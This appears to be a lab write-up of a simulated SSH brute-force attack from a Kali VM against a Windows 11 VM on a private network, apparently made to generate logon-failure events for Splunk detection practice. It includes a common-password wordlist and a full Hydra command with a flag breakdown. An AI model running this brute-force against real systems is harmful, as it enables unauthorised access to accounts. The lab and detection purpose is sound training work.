# Attack Simulation — SSH Brute Force

## Environment

| Machine | Role | IP |
|---|---|---|
| Kali Linux | Attacker | 10.0.2.x |
| Windows 11 VM | Victim | 10.0.2.15 |

## Prerequisites

- OpenSSH Server enabled on Windows VM
- Port 22 listening and confirmed
- Both VMs on same NAT Network
- Windows Firewall disabled on victim

## Password List Created

File: ~/passwords.txt
```
123456
password
admin
admin123
letmein
welcome
monkey
dragon
master
shadow
qwerty
abc123
pass123
test
root
toor
kali
linux
secret
wrong1
wrong2
wrong3
```

## Hydra Command Used
```
hydra -l User -P ~/passwords.txt ssh://10.0.2.15 -t 4 -V
```

### Command Breakdown

| Flag | Meaning |
|---|---|
| -l User | Target username |
| -P ~/passwords.txt | Password list file |
| ssh://10.0.2.15 | Target IP over SSH |
| -t 4 | 4 parallel threads |
| -V | Verbose output |

## Result
```
1 of 1 target completed
0 valid passwords found
SSH protocol errors encountered
Account lockout triggered on target
```

## Logs Generated

- EventCode 4625 — Failed logon (30+ events)
- EventCode 4625 — Account lockout events
- Logon Type 8 — Network cleartext via SSH
```

Name:
```
Investigation/splunk-queries.md
